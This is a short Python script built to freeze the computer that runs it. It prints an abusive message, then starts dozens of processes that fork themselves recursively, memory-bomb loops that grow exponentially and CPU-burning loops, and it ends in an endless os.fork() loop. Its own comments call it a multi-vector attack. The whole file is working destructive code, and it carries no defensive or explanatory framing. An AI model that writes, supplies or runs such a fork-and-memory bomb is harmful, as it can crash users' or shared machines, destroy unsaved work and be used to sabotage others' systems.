#!/usr/bin/env python3
import os
import sys
from multiprocessing import Process

def display_message():
    """Show message before freeze"""
    os.system('clear')
    print('\033[2J\033[H', end='')
    print('\n' * 10)
    print(' ' * 20 + 'Get fucked bitch')
    sys.stdout.flush()

def memory_bomb():
    """Allocate massive memory to choke the system"""
    data = []
    while True:
        data.append(' ' * 10**6)  # 1MB chunks
        data.append(data[:])  # Duplicate to eat RAM faster

def fork_spam():
    """Spawn processes recursively"""
    while True:
        try:
            p = Process(target=fork_spam)
            p.start()
            p = Process(target=memory_bomb)
            p.start()
        except:
            pass

def cpu_burn():
    """Max out CPU"""
    while True:
        pass

if __name__ == '__main__':
    # Show message first
    display_message()
    
    # Multi-vector attack: forks + memory + CPU
    for i in range(50):
        try:
            Process(target=fork_spam).start()
            Process(target=memory_bomb).start()
            Process(target=cpu_burn).start()
        except:
            pass
    
    # Main process also contributes to freeze
    while True:
        os.fork()
